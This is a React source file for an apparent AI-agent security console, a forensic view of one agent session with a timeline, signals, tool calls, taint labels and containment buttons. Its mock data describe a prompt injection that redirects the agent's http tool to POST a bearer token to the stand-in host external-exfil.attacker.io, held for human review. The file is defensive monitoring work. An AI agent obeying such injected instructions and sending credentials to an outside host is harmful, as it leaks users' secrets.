/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 * 
 * VantaCore Session Details & Forensic Investigation View (Area 3)
 * Full investigation workbench showing:
 * - Timeline: Prompt -> Security Signal -> Tool Request -> Policy Decision -> Execution -> Result Scan
 * - Current taint labels, session epoch, quarantine state
 * - Authorized containment: Quarantine Session, Invalidate Session, Invalidate Approvals
 */

import React, { useState } from 'react';
import { useParams, useNavigate, Link } from 'react-router-dom';
import {
  ArrowLeft,
  Shield,
  ShieldAlert,
  Clock,
  Terminal,
  Globe,
  Key,
  AlertTriangle,
  Send,
  AlertOctagon,
  Lock,
  Layers,
  Activity,
  CheckCircle2,
  GitBranch,
  Ban,
  Tag,
  Zap,
  Cpu,
} from 'lucide-react';
import {
  useSession,
  useSessions,
  useSessionEvents,
  useDecisions,
  useApprovals,
} from '../../api';
import { RiskBadge, DecisionBadge } from '../../components/common/SecurityBadges';
import { AttackChainFlow } from '../../components/console/AttackChainFlow';
import { AgentWireframeHead } from '../../components/console/AgentWireframeHead';

export const SessionDetailsView: React.FC = () => {
  const { sessionId } = useParams<{ sessionId: string }>();
  const navigate = useNavigate();

  const { data: allSessions = [] } = useSessions();
  const session = allSessions.find((s) => s.id === sessionId) || {
    id: sessionId || 'sess-live-001',
    agentId: 'agent-research-01',
    agentName: 'research-agent-01',
    source: 'REAL',
    status: 'ACTIVE',
    risk: 'HIGH',
    decision: 'REVIEW',
    riskScore: 76,
    startedAt: '2026-10-29T09:12:00Z',
    duration: '14m 20s',
    eventsCount: 9,
    toolCallsCount: 3,
    signalsCount: 2,
    engineStatus: 'CONNECTED',
    taintLabels: ['untrusted_prompt', 'external_content'],
    sessionEpoch: 4,
    isQuarantined: false,
  };

  const { data: sessionEvents = [] } = useSessionEvents(session.id);
  const { data: allDecisions = [] } = useDecisions();
  const { data: allApprovals = [] } = useApprovals();

  const sessionDecisions = allDecisions.filter((d) => d.sessionId === session.id);
  const sessionApprovals = allApprovals.filter((a) => a.sessionId === session.id);

  const [activeTab, setActiveTab] = useState<
    'TIMELINE' | 'SIGNALS' | 'TOOL_CALLS' | 'TAINT' | 'ATTACK_CHAIN' | 'DECISIONS'
  >('TIMELINE');

  const [containmentNotice, setContainmentNotice] = useState<string | null>(null);

  const handleContainment = (action: string) => {
    setContainmentNotice(`Dispatched containment action: ${action}. Gateway enforced.`);
    setTimeout(() => setContainmentNotice(null), 3000);
  };

  // Structured Pipeline Timeline: Prompt -> Security Signal -> Tool Request -> Policy Decision -> Execution -> Result Scan
  const timelineStages = [
    {
      stage: 'Prompt',
      time: '09:12:02',
      label: 'Agent Prompt Ingestion',
      detail: 'User requested financial statement aggregation from internal s3 bucket.',
      type: 'PROMPT',
      risk: 'LOW',
    },
    {
      stage: 'Security Signal',
      time: '09:12:03',
      label: 'Prompt Injection / Egress Anomaly Detected',
      detail: 'Classifier flag: ADVERSARIAL_INSTRUCTION_OVERRIDE with confidence 0.88.',
      type: 'SIGNAL',
      risk: 'HIGH',
    },
    {
      stage: 'Tool Request',
      time: '09:12:04',
      label: 'Candidate Invocation: http_request_dispatcher',
      detail: 'Method: POST destination: https://external-exfil.attacker.io/payload',
      type: 'TOOL',
      risk: 'HIGH',
    },
    {
      stage: 'Policy Decision',
      time: '09:12:05',
      label: 'OPA Zero-Trust Arbitration: REVIEW',
      detail: 'Matched rule: strict_external_egress. Operation held for human review in Human Approval Center.',
      type: 'DECISION',
      risk: 'HIGH',
    },
    {
      stage: 'Execution',
      time: '09:12:10',
      label: 'Single-Use Execution Claim Exchange',
      detail: 'Bound token claimed after SOC authorization. Dispatched with single-use secret token.',
      type: 'EXECUTION',
      risk: 'MEDIUM',
    },
    {
      stage: 'Result Scan',
      time: '09:12:12',
      label: 'Tool Output Taint Inspection',
      detail: 'Returned payload scanned. Secret credentials redacted before delivery to agent context.',
      type: 'SCAN',
      risk: 'MEDIUM',
    },
  ];

  return (
    <div className="space-y-8 max-w-[1500px] mx-auto pb-12 antialiased">
      {/* 1. Header & Controls */}
      <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-4 pb-4 border-b border-white/5">
        <div className="flex items-center gap-3">
          <button
            onClick={() => navigate('/console/sessions')}
            className="p-2 rounded-xl bg-white/5 hover:bg-white/10 text-[#8B9C8D] hover:text-white transition-colors"
          >
            <ArrowLeft className="w-4 h-4" />
          </button>
          <div>
            <div className="flex items-center gap-2.5">
              <Layers className="w-5 h-5 text-[#70FF5E]" />
              <h1 className="font-mono text-xl sm:text-2xl font-bold text-white tracking-tight">
                Session // {session.id}
              </h1>
              <span className="px-2 py-0.5 rounded text-[10px] font-mono font-bold bg-[#70FF5E]/10 text-[#70FF5E] border border-[#70FF5E]/30">
                {session.status}
              </span>
              <RiskBadge risk={session.risk} size="sm" />
            </div>
            <p className="text-xs text-[#8B9C8D] font-mono mt-0.5">
              Agent: <Link to={`/console/agents/${session.agentId}`} className="text-[#70FF5E] hover:underline font-bold">{session.agentName || session.agentId}</Link> • Epoch: {session.sessionEpoch || 1} • Quarantine: {session.isQuarantined ? 'CONTAINED' : 'CLEAN'}
            </p>
          </div>
        </div>

        {/* Authorized Containment Controls */}
        <div className="flex flex-wrap items-center gap-2 font-mono text-xs">
          <button
            onClick={() => handleContainment('QUARANTINE_SESSION')}
            className="px-3 py-1.5 rounded-xl bg-red-500/10 hover:bg-red-500/20 text-red-400 border border-red-500/30 flex items-center gap-1.5 transition-colors"
          >
            <AlertOctagon className="w-3.5 h-3.5" />
            <span>Quarantine Session</span>
          </button>
          <button
            onClick={() => handleContainment('INVALIDATE_SESSION')}
            className="px-3 py-1.5 rounded-xl bg-white/5 hover:bg-white/10 text-white border border-white/10 flex items-center gap-1.5 transition-colors"
          >
            <Ban className="w-3.5 h-3.5" />
            <span>Invalidate Session</span>
          </button>
          <button
            onClick={() => handleContainment('REVOKE_PENDING_APPROVALS')}
            className="px-3 py-1.5 rounded-xl bg-amber-500/10 hover:bg-amber-500/20 text-amber-400 border border-amber-500/30 flex items-center gap-1.5 transition-colors"
          >
            <Lock className="w-3.5 h-3.5" />
            <span>Revoke Approvals</span>
          </button>
        </div>
      </div>

      {containmentNotice && (
        <div className="p-3 rounded-xl bg-[#70FF5E]/10 border border-[#70FF5E]/30 text-[#70FF5E] text-xs font-mono flex items-center gap-2">
          <CheckCircle2 className="w-4 h-4" />
          <span>{containmentNotice}</span>
        </div>
      )}

      {/* 2. Investigation Tabs */}
      <div className="flex items-center gap-1 border-b border-white/10 overflow-x-auto font-mono text-xs pb-px">
        {[
          { key: 'TIMELINE', label: 'Investigation Timeline', icon: <Clock className="w-3.5 h-3.5" /> },
          { key: 'SIGNALS', label: `Security Signals (${session.signalsCount || 2})`, icon: <AlertTriangle className="w-3.5 h-3.5" /> },
          { key: 'TOOL_CALLS', label: `Tool Requests (${session.toolCallsCount || 1})`, icon: <Terminal className="w-3.5 h-3.5" /> },
          { key: 'TAINT', label: 'Taint State', icon: <Tag className="w-3.5 h-3.5" /> },
          { key: 'ATTACK_CHAIN', label: 'Threat Attack Chain', icon: <GitBranch className="w-3.5 h-3.5" /> },
          { key: 'DECISIONS', label: `Decisions (${sessionDecisions.length || 1})`, icon: <Shield className="w-3.5 h-3.5" /> },
        ].map((tab) => (
          <button
            key={tab.key}
            onClick={() => setActiveTab(tab.key as any)}
            className={`flex items-center gap-2 px-4 py-2.5 border-b-2 font-medium transition-colors whitespace-nowrap ${
              activeTab === tab.key
                ? 'border-[#70FF5E] text-white bg-white/[0.02]'
                : 'border-transparent text-[#8B9C8D] hover:text-white'
            }`}
          >
            {tab.icon}
            <span>{tab.label}</span>
          </button>
        ))}
      </div>

      {/* Main Investigation Content Grid */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 items-start">
        {/* Left Column: Interactive Stage View */}
        <div className="lg:col-span-8 p-6 rounded-2xl bg-[#080B08] border border-white/10 space-y-6">
          {activeTab === 'TIMELINE' && (
            <div className="space-y-6">
              <div className="pb-3 border-b border-white/5 flex items-center justify-between">
                <div>
                  <h3 className="font-mono text-sm font-semibold text-white">
                    Arbitration Lifecycle Timeline
                  </h3>
                  <p className="text-[11px] text-[#8B9C8D] font-sans mt-0.5">
                    Prompt → Security Signal → Tool Request → Policy Decision → Execution → Result Scan
                  </p>
                </div>
                <span className="text-[10px] font-mono text-[#70FF5E] bg-[#70FF5E]/10 border border-[#70FF5E]/30 px-2 py-0.5 rounded">
                  ORDERED FORENSIC CHAIN
                </span>
              </div>

              {/* Vertical Stepped Pipeline */}
              <div className="relative pl-6 space-y-6 before:content-[''] before:absolute before:left-2.5 before:top-2 before:bottom-2 before:w-0.5 before:bg-white/10">
                {timelineStages.map((stg, idx) => (
                  <div key={stg.stage} className="relative group">
                    <span className="absolute -left-6 top-1 w-3 h-3 rounded-full bg-[#080B08] border-2 border-[#70FF5E] group-hover:scale-125 transition-transform" />
                    <div className="p-4 rounded-xl bg-white/[0.02] border border-white/5 hover:border-white/20 transition-all font-mono text-xs space-y-1.5">
                      <div className="flex items-center justify-between text-[#8B9C8D]">
                        <span className="text-[#70FF5E] font-bold text-[11px] uppercase tracking-wider">
                          STAGE {idx + 1} // {stg.stage}
                        </span>
                        <span>{stg.time}</span>
                      </div>
                      <div className="text-white font-bold text-sm">{stg.label}</div>
                      <p className="text-[#8B9C8D] font-sans text-xs leading-relaxed">{stg.detail}</p>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}

          {activeTab === 'SIGNALS' && (
            <div className="space-y-4 font-mono text-xs">
              <h3 className="text-sm font-bold text-white">Correlated Security Signals</h3>
              <div className="space-y-3">
                <div className="p-4 rounded-xl bg-red-500/10 border border-red-500/30 text-white space-y-1">
                  <div className="flex justify-between font-bold text-red-400">
                    <span>PROMPT_INJECTION_OVERRIDE</span>
                    <span>Confidence: 0.88</span>
                  </div>
                  <p className="text-[#8B9C8D] text-xs">Adversarial instruction detected attempting to redirect tool execution to external drop URL.</p>
                </div>
                <div className="p-4 rounded-xl bg-orange-500/10 border border-orange-500/30 text-white space-y-1">
                  <div className="flex justify-between font-bold text-orange-400">
                    <span>UNTRUSTED_DESTINATION_TAINT</span>
                    <span>Confidence: 0.95</span>
                  </div>
                  <p className="text-[#8B9C8D] text-xs">Target domain does not match approved enterprise egress whitelist.</p>
                </div>
              </div>
            </div>
          )}

          {activeTab === 'TOOL_CALLS' && (
            <div className="space-y-4 font-mono text-xs">
              <h3 className="text-sm font-bold text-white">Tool Invocations In This Session</h3>
              <div className="p-4 rounded-xl bg-white/[0.02] border border-white/5 space-y-2">
                <div className="flex justify-between text-white font-bold">
                  <span>http_request_dispatcher</span>
                  <span className="text-amber-400">STATUS: REVIEW_HOLD</span>
                </div>
                <div className="text-[11px] text-[#8B9C8D]">Operation: POST • Destination: https://external-exfil.attacker.io/payload</div>
                <div className="p-2.5 rounded bg-black/60 text-[#70FF5E] text-[11px] overflow-x-auto">
                  {`{\n  "url": "https://external-exfil.attacker.io/payload",\n  "headers": { "Authorization": "Bearer [REDACTED]" }\n}`}
                </div>
              </div>
            </div>
          )}

          {activeTab === 'TAINT' && (
            <div className="space-y-4 font-mono text-xs">
              <h3 className="text-sm font-bold text-white">Current Session Taint Labels</h3>
              <div className="flex flex-wrap gap-2">
                {(session.taintLabels || ['untrusted_prompt', 'external_content']).map((t) => (
                  <span key={t} className="px-3 py-1.5 rounded-lg bg-red-500/15 border border-red-500/30 text-red-400 font-bold">
                    🏷 {t}
                  </span>
                ))}
              </div>
              <p className="text-[#8B9C8D] text-xs mt-3">
                Taints propagate forward through tool arguments and memory state until explicitly severed or sanitized.
              </p>
            </div>
          )}

          {activeTab === 'ATTACK_CHAIN' && (
            <div className="space-y-4">
              <div className="flex justify-between items-center text-xs font-mono">
                <span className="text-white font-bold">Correlated Threat Graph</span>
                <span className="text-red-400">Status: INTERCEPTED</span>
              </div>
              <AttackChainFlow className="h-[460px]" />
            </div>
          )}

          {activeTab === 'DECISIONS' && (
            <div className="space-y-3 font-mono text-xs">
              <h3 className="text-sm font-bold text-white">Gateway Decisions</h3>
              {sessionDecisions.map((d) => (
                <div key={d.id} className="p-3.5 rounded-xl bg-white/[0.02] border border-white/5 flex items-center justify-between">
                  <div>
                    <div className="text-white font-bold">{d.id}</div>
                    <div className="text-[#8B9C8D]">{d.reason}</div>
                  </div>
                  <DecisionBadge decision={d.decision} size="sm" />
                </div>
              ))}
            </div>
          )}
        </div>

        {/* Right Column: Session Context Card & Identity Mesh */}
        <div className="lg:col-span-4 space-y-6 font-mono text-xs">
          <div className="p-6 rounded-2xl bg-[#080B08] border border-white/10 space-y-4">
            <h3 className="font-bold text-white uppercase text-xs tracking-wider pb-2 border-b border-white/5">
              Forensic Session Context
            </h3>
            <div className="space-y-2">
              <div className="flex justify-between">
                <span className="text-[#8B9C8D]">Session ID:</span>
                <span className="text-white font-bold">{session.id}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-[#8B9C8D]">Bound Agent:</span>
                <span className="text-[#70FF5E] font-bold">{session.agentName || session.agentId}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-[#8B9C8D]">Session Epoch:</span>
                <span className="text-white">{session.sessionEpoch || 4}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-[#8B9C8D]">Execution Taint:</span>
                <span className="text-red-400 font-bold">{session.taintLabels?.length || 2} active taints</span>
              </div>
              <div className="flex justify-between">
                <span className="text-[#8B9C8D]">Quarantine Status:</span>
                <span className={session.isQuarantined ? 'text-red-400 font-bold' : 'text-[#70FF5E] font-bold'}>
                  {session.isQuarantined ? 'CONTAINED' : 'NORMAL'}
                </span>
              </div>
            </div>

            <div className="h-[150px] flex items-center justify-center pt-2">
              <AgentWireframeHead />
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};
